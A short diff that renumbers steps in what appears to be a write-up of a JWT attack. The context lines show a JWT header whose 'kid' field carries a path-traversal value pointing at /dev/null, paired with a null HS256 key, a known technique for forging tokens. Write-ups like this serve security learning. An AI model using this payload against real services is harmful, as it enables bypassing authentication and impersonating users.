@@ -75,11 +75,11 @@ Note: JWK Sets like this are sometimes exposed publicly via a standard endpoint,
     "k": "AA=="
 }
 ```
-5. Upload kid
+3. Upload kid
 ```bash
 {
     "kid": "../../../../../../../../../../../../dev/null",
     "alg": "HS256"
 }
 ```
-6. Finally I had to upload signature
+4. Finally I had to upload signature
